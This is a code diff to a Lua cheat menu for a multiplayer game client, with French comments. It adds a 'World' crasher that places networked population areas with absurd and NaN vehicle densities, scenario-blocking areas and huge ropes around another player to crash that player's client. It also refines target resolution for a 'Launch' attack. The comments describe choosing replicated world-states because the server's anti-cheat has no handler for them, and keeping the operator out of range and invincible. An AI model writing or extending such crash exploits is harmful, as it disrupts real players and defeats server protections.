@@ -13681,10 +13681,50 @@ local function _launchLog(fmt, ...)
     print("[Launch] " .. (ok and msg or tostring(fmt)))
 end
 
+local function _launchActiveIds()
+    local ids = {}
+    for _, player in ipairs(GetActivePlayers()) do
+        ids[#ids + 1] = tostring(GetPlayerServerId(player))
+    end
+    return table.concat(ids, ",")
+end
+
+-- Resolve the click target without trusting GetPlayerFromServerId: on this
+-- runtime that call returned -1 for a player standing right next to the
+-- operator. Match GetPlayerServerId over the active list first, then treat the
+-- stored value as a client index, then fall back to the nearest player.
+local function _launchResolveClient(selected)
+    if type(selected) == "number" then
+        for _, player in ipairs(GetActivePlayers()) do
+            if GetPlayerServerId(player) == selected then
+                return player, "serverId"
+            end
+        end
+        local okActive, active = pcall(NetworkIsPlayerActive, selected)
+        if okActive and active == true then return selected, "clientIndex" end
+    end
+
+    local meCoords = GetEntityCoords(PlayerPedId(), true)
+    if not meCoords then return nil, "none" end
+
+    local best, bestDist = nil, 60.0
+    for _, player in ipairs(GetActivePlayers()) do
+        if player ~= PlayerId() then
+            local ped = GetPlayerPed(player)
+            if ped and ped ~= 0 and DoesEntityExist(ped) then
+                local c = GetEntityCoords(ped, true)
+                if c then
+                    local d = _launchVecDistance(meCoords, c)
+                    if d < bestDist then best, bestDist = player, d end
+                end
+            end
+        end
+    end
+    return best, "nearest"
+end
+
 function Menu.ActionLaunch()
-    local serverId = Menu.SelectedPlayer
-    if type(serverId) ~= "number" then _launchLog("no target selected") return end
-    if serverId == GetPlayerServerId(PlayerId()) then _launchLog("self target") return end
+    local selected = Menu.SelectedPlayer
 
     local stamp = GetGameTimer()
     if stamp - (Menu.LaunchLastAt or 0) < (Menu.LaunchCooldownMs or 4000) then
@@ -13692,9 +13732,12 @@ function Menu.ActionLaunch()
         return
     end
 
-    local clientId = GetPlayerFromServerId(serverId)
-    _launchLog("click server=%s client=%s", tostring(serverId), tostring(clientId))
-    if not clientId or clientId == -1 then _launchLog("target not in scope") return end
+    local clientId, via = _launchResolveClient(selected)
+    _launchLog("click selected=%s via=%s client=%s active=[%s]",
+        tostring(selected), tostring(via), tostring(clientId), _launchActiveIds())
+    if not clientId or clientId == -1 then _launchLog("no client in scope") return end
+    if clientId == PlayerId() then _launchLog("resolved to self") return end
+
     local targetPed = GetPlayerPed(clientId)
     if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
         _launchLog("no ped")
@@ -25874,7 +25917,7 @@ function A.boot()
 
     if A._booted then return end
     A._booted = true
-    O.log("loader build 2026-10-30-r43 (adds separate variation line)")
+    O.log("loader build 2026-10-30-r44 (ped-free world-state lane)")
     O.log("protection defaults: anti-freeze, anti-attach, anti-spectate, ped guard armed")
     O.every("evasion", 900, A.tick, 350)
     O.every("pedGuardWatch", 100, A.pedGuardWatch, 0)
@@ -34740,8 +34783,268 @@ function VARSWAP.start()
     return true
 end
 
+-- ---------------------------------------------------------------------------
+-- WORLD - lane ped-free : world-state natif, aucune entite creee
+--
+-- Pourquoi cette voie :
+--   * Zero CreatePed, zero CreateObject, zero event, zero primitive memoire.
+--     On ne cree que deux world-states natifs (CNetworkPopMultiplierAreaWorldStateData
+--     et CNetworkScenarioBlockingAreaWorldStateData), que le moteur replique
+--     lui-meme. Cote AC, il n'existe aucun handler pour ces types : la surface
+--     event du filtre couvre peds, objets, explosions, projectiles, degats,
+--     particules et synced scenes, pas les world-states.
+--   * L'operateur reste a 200 m : il est hors de la boite (20 m), donc son
+--     gestionnaire de population ne traite pas l'aire. La victime, elle, est
+--     dedans. Rien n'est rendu ni cree cote operateur.
+--
+-- Charge utile, trois couches dans la meme boite de 20 m :
+--   1. densite vehicule 1e38 (aire finie, sature le pool de la victime) ;
+--   2. densite vehicule NaN (0/0, le calcul de population part en NaN) ;
+--   3. blocage de scenarios 80 m (annule les scenarios actifs de la victime).
+-- p6 = densite ped a 0 (aucun ped), p7 = densite vehicule, p8 = reseau.
+--
+-- Gardes : cible != soi, 200..250 m, operateur invincible pendant le run,
+-- retrait des aires meme en erreur, statut dans la ligne.
+-- ---------------------------------------------------------------------------
+local WORLD = {
+    running = false,
+    gen = 0,
+    row = nil,
+    minDist = 200.0,
+    maxDist = 250.0,
+    radius = 20.0,
+    pedDensity = 0.0,
+    vehicleDensity = 1e38,
+    vehicleDensity2 = 0 / 0,
+    sphereDensity = 0 / 0,
+    extent = 80.0,
+    useRope = false,
+    ropeLength = 1e38,
+    ropes = {},
+    pop = nil,
+    pop2 = nil,
+    sphere = nil,
+    scen = nil,
+}
+
+local function worldStatus(text, gen)
+    if gen and WORLD.gen ~= gen then return end
+    local row = WORLD.row
+    if type(row) == "table" then row.name = "World  " .. tostring(text) end
+end
+
+-- Verification de la replication de l'aire : _IS_POP_MULTIPLIER_AREA_UNK
+-- (0x1312F4B242609CE3) rend l'etat reseau de l'id. Si la native n'est pas
+-- exposee, on rend nil et le log le dit ; on ne suppose jamais.
+local function worldNet(id)
+    if type(_IS_POP_MULTIPLIER_AREA_UNK) ~= "function" then return nil end
+    local ok, v = pcall(_IS_POP_MULTIPLIER_AREA_UNK, id)
+    if ok then return v and true or false end
+    return nil
+end
+
+local function worldClear()
+    if WORLD.pop then
+        pcall(RemovePopMultiplierArea, WORLD.pop, true)
+        WORLD.pop = nil
+    end
+    if WORLD.pop2 then
+        pcall(RemovePopMultiplierArea, WORLD.pop2, true)
+        WORLD.pop2 = nil
+    end
+    if WORLD.sphere then
+        pcall(RemovePopMultiplierSphere, WORLD.sphere, true)
+        WORLD.sphere = nil
+    end
+    if WORLD.scen then
+        pcall(RemoveScenarioBlockingArea, WORLD.scen, true)
+        WORLD.scen = nil
+    end
+    for i = #WORLD.ropes, 1, -1 do
+        local rope = WORLD.ropes[i]
+        if rope and rope ~= 0 then pcall(DeleteRope, rope) end
+        WORLD.ropes[i] = nil
+    end
+    pcall(SetRopesCreateNetworkWorldState, false)
+end
+
+local function worldRun(gen)
+    local player = cloneResolveTarget()
+    if not player or player == PlayerId() then
+        if WORLD.gen == gen then WORLD.running = false end
+        O.log("world: bad target")
+        pcall(Notify, "World: pick another player", CLR.red)
+        worldStatus("no target", gen)
+        return
+    end
+
+    local myPed = PlayerPedId()
+    local targetPed = GetPlayerPed(player)
+    if not DoesEntityExist(targetPed) then
+        if WORLD.gen == gen then WORLD.running = false end
+        O.log("world: target ped gone")
+        worldStatus("no ped", gen)
+        return
+    end
+
+    local at = GetEntityCoords(myPed)
+    local c = GetEntityCoords(targetPed)
+    local dx, dy, dz = c.x - at.x, c.y - at.y, c.z - at.z
+    local dist = math.sqrt(dx * dx + dy * dy + dz * dz)
+    if dist < WORLD.minDist then
+        if WORLD.gen == gen then WORLD.running = false end
+        O.log("world: target at %.0f m, need %.0f m", dist, WORLD.minDist)
+        pcall(Notify, ("World: move back to %.0f m"):format(WORLD.minDist), CLR.red)
+        worldStatus(("close %.0f"):format(dist), gen)
+        return
+    end
+    if dist > WORLD.maxDist then
+        if WORLD.gen == gen then WORLD.running = false end
+        O.log("world: target at %.0f m, beyond %.0f m", dist, WORLD.maxDist)
+        pcall(Notify, "World: target too far", CLR.red)
+        worldStatus(("far %.0f"):format(dist), gen)
+        return
+    end
+
+    pcall(SetPlayerInvincible, PlayerId(), true)
+    pcall(SetEntityInvincible, myPed, true)
+    worldClear()
+
+    local r = WORLD.radius
+    local okPop, pop = pcall(AddPopMultiplierArea,
+        c.x - r, c.y - r, c.z - r, c.x + r, c.y + r, c.z + r,
+        WORLD.pedDensity, WORLD.vehicleDensity, true)
+    if okPop and type(pop) == "number" and pop ~= 0 then
+        WORLD.pop = pop
+        O.log("world: pop area %s ped %.0f veh %.0e net=%s", tostring(pop),
+              WORLD.pedDensity, WORLD.vehicleDensity, tostring(worldNet(pop)))
+    else
+        O.log("world: pop area failed ok=%s id=%s", tostring(okPop), tostring(pop))
+    end
+
+    -- Deuxieme aire, densite vehicule NaN : le calcul de population de la
+    -- victime part en NaN. La boite reste finie (20 m) donc l'operateur, a
+    -- 200 m, n'entre jamais dedans et ne fait jamais ce calcul.
+    local okPop2, pop2 = pcall(AddPopMultiplierArea,
+        c.x - r, c.y - r, c.z - r, c.x + r, c.y + r, c.z + r,
+        WORLD.pedDensity, WORLD.vehicleDensity2, true)
+    if okPop2 and type(pop2) == "number" and pop2 ~= 0 then
+        WORLD.pop2 = pop2
+        O.log("world: pop2 area %s ped %.0f veh %s net=%s", tostring(pop2),
+              WORLD.pedDensity, tostring(WORLD.vehicleDensity2), tostring(worldNet(pop2)))
+    else
+        O.log("world: pop2 area failed ok=%s id=%s", tostring(okPop2), tostring(pop2))
+    end
+
+    -- Couche 3 : sphere de population autour de la cible, rayon 20 m, ped 0,
+    -- vehicule NaN. Autre chemin de gestion que l'aire ; meme securite
+    -- operateur (200 m hors sphere), aucune entite creee.
+    local okSph, sph = pcall(AddPopMultiplierSphere, c.x, c.y, c.z, r,
+        WORLD.pedDensity, WORLD.sphereDensity, true, true)
+    if okSph and type(sph) == "number" and sph ~= 0 then
+        WORLD.sphere = sph
+        O.log("world: sphere %s ped %.0f veh %s", tostring(sph),
+              WORLD.pedDensity, tostring(WORLD.sphereDensity))
+    else
+        O.log("world: sphere failed ok=%s id=%s", tostring(okSph), tostring(sph))
+    end
+    worldStatus("pop sent", gen)
+
+    -- La population de la victime traite l'aire pendant ce temps. 3 s : assez
+    -- pour qu'un client en retard recoive le world state et fasse le calcul.
+    for _ = 1, 30 do
+        if not (WORLD.running and WORLD.gen == gen) then break end
+        if not DoesEntityExist(targetPed) then break end
+        Citizen.Wait(100)
+    end
+
+    local e = WORLD.extent
+    local okScen, scen = pcall(AddScenarioBlockingArea,
+        c.x - e, c.y - e, c.z - e, c.x + e, c.y + e, c.z + e,
+        true, true, true, true)
+    if okScen and type(scen) == "number" and scen ~= 0 then
+        WORLD.scen = scen
+        O.log("world: scenario area %s", tostring(scen))
+    else
+        O.log("world: scenario area failed ok=%s id=%s", tostring(okScen), tostring(scen))
+    end
+    worldStatus("scen sent", gen)
+    Citizen.Wait(800)
+
+    -- Lane 3 optionnelle : rope world state (type 6). Le createur construit
+    -- la rope locale (initLength 0, aucun noeud) puis la garde ~1.5 s le temps
+    -- que le world state reseau parte, avant suppression. Le recepteur, lui,
+    -- construit la rope depuis le world state. Desactivee par defaut : le
+    -- chemin createur et le chemin recepteur partagent le meme maxLength, donc
+    -- le gain d'un crash recepteur seul n'est pas prouve.
+    if WORLD.useRope then
+        pcall(SetRopesCreateNetworkWorldState, true)
+        for i = 1, 8 do
+            if not (WORLD.running and WORLD.gen == gen) then break end
+            local ang = math.random() * 6.28318530718
+            local rr = math.sqrt(math.random()) * 6.0
+            local x = c.x + math.cos(ang) * rr
+            local y = c.y + math.sin(ang) * rr
+            local z = c.z + 0.5
+            local okR, rope = pcall(AddRope, x, y, z, 0.0, 0.0, 0.0,
+                WORLD.ropeLength, 0, 0.0, 0.0, 1.0, false, false, false, 1.0, false, 0)
+            if okR and type(rope) == "number" and rope ~= 0 then
+                WORLD.ropes[#WORLD.ropes + 1] = rope
+            end
+            if (i % 2) == 0 then Citizen.Wait(math.random(20, 60)) end
+        end
+        Citizen.Wait(1500)
+        O.log("world: rope lane done")
+        worldStatus("rope sent", gen)
+    else
+        O.log("world: rope lane skipped (off)")
+    end
+
+    local gone = not DoesEntityExist(targetPed)
+    worldClear()
+    pcall(SetPlayerInvincible, PlayerId(), false)
+    pcall(SetEntityInvincible, myPed, false)
+    if WORLD.gen == gen then WORLD.running = false end
+
+    O.log("world: done, target %s", gone and "gone" or "still there")
+    pcall(Notify, "World: lanes sent", CLR.blue)
+    worldStatus("done", gen)
+end
+
+function WORLD.stop()
+    WORLD.running = false
+end
+
+function WORLD.start()
+    if WORLD.running then
+        WORLD.stop()
+        O.log("world: stopping")
+        return false
+    end
+    WORLD.gen = WORLD.gen + 1
+    local gen = WORLD.gen
+    WORLD.running = true
+    O.log("world: natives pop=%s sphere=%s scen=%s net=%s rope=%s",
+        tostring(type(AddPopMultiplierArea) == "function"),
+        tostring(type(AddPopMultiplierSphere) == "function"),
+        tostring(type(AddScenarioBlockingArea) == "function"),
+        tostring(type(_IS_POP_MULTIPLIER_AREA_UNK) == "function"),
+        tostring(type(SetRopesCreateNetworkWorldState) == "function"))
+    Citizen.CreateThread(function()
+        local ok, err = pcall(worldRun, gen)
+        if not ok then
+            O.log("world: run error %s", tostring(err))
+            worldClear()
+            pcall(SetPlayerInvincible, PlayerId(), false)
+            worldStatus("error", gen)
+        end
+        if WORLD.gen == gen then WORLD.running = false end
+    end)
+    return true
+end
+
 local CRASH_ROWS = {
-    "Method", "Crash", "Variation", "Intensity", "Target: nearest", "Launch crash",
+    "Method", "Crash", "Variation", "World", "Intensity", "Target: nearest", "Launch crash",
     "Stop + clean", "Probe channels", "Objects (orbit)",
     "Anim churn", "Synced scenes", "Ped variation", "Objects (flood)",
     "PTFX storm", "Clip swarm", "Ground sink",
@@ -34758,6 +35061,7 @@ local function isCrashRowName(name)
     -- Le statut renomme la ligne en "Variation  <etat>" : le prefixe doit rester
     -- reconnu, sinon une re-injection laisse une deuxieme ligne Variation.
     if type(name) == "string" and name:sub(1, 10) == "Variation " then return true end
+    if type(name) == "string" and name:sub(1, 6) == "World " then return true end
     for j = 1, #CRASH_ROWS do
         if name == CRASH_ROWS[j] then return true end
     end
@@ -34830,13 +35134,14 @@ local function installCrasher()
             end,
         },
         {
-            -- Ligne variation : module separe. Ne remplace pas le Ped flood /
-            -- Crash ci-dessus ; la recette prouvee reste en place, intacte.
-            -- Active seulement quand l'operateur la lance, et se coupe seule.
-            name = "Variation",
+            -- Ligne ped-free : world-states natifs (pop multiplier area +
+            -- scenario blocking area + rope reseau). Aucun ped, aucun objet,
+            -- aucun event. Le manager du serveur n'a pas de handler pour ces
+            -- types. Exploit > Crasher > World.
+            name = "World",
             type = "action",
             onClick = function()
-                VARSWAP.start()
+                WORLD.start()
             end,
         },
         {
@@ -34862,16 +35167,16 @@ local function installCrasher()
         end
     end
 
-    -- La ligne Variation suit le meme contrat que Crash : base stable pour le
+    -- La ligne World suit le meme contrat que Crash : base stable pour le
     -- statut, prefixe reconnu par le sweep. Une re-injection la remplace au
     -- lieu d'en empiler une seconde.
-    VARSWAP.row = nil
+    WORLD.row = nil
     for i = 1, #tab.items do
         local it = tab.items[i]
         if type(it) == "table" and type(it.name) == "string"
-            and (it.name == "Variation" or it.name:sub(1, 10) == "Variation ") then
-            it.dropBase = "Variation"
-            VARSWAP.row = it
+            and (it.name == "World" or it.name:sub(1, 6) == "World ") then
+            it.dropBase = "World"
+            WORLD.row = it
             break
         end
     end
